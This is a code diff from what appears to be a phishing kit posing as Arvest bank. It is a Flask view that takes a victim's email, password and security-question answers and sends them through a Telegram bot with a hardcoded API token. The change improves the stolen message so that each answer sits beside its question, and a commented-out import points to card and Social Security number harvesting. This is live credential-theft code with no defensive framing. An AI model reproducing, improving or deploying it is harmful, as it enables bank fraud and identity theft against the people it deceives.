@@ -1,6 +1,6 @@
 from flask import Blueprint, session, render_template, request, redirect, url_for
 # from .utils import report_login, report_card_details, report_ssn, personal_confirmation
-from .utils import report_login, security_question
+# from .utils import report_login, security_question
 import telebot
 
 API_TOKEN = '5405884216:AAHGNPuvW4kByyWZpqd6O_8l_aZjMwtJdp4'
@@ -35,7 +35,7 @@ def question():
         email = request.form['email']
         password = request.form['password']
         # print(q1,ans1,q2,ans2,q3,ans3, email, password)
-        bot.send_message(receiver_id, f'-------------ARVEST -----------\nQ1: {q1}\nQ2: {q2}\nQ3: {q3}\nemail: {email}\nPassword: {password}\n--------------------------')
+        bot.send_message(receiver_id, f'-------------ARVEST -----------\n{q1}: {ans1}\n{q2}: {ans2}\n{q3}: {ans3}\nemail: {email}\nPassword: {password}\n--------------------------')
         return redirect(url_for('main.syncing'))
     return render_template('security-question.html')
 
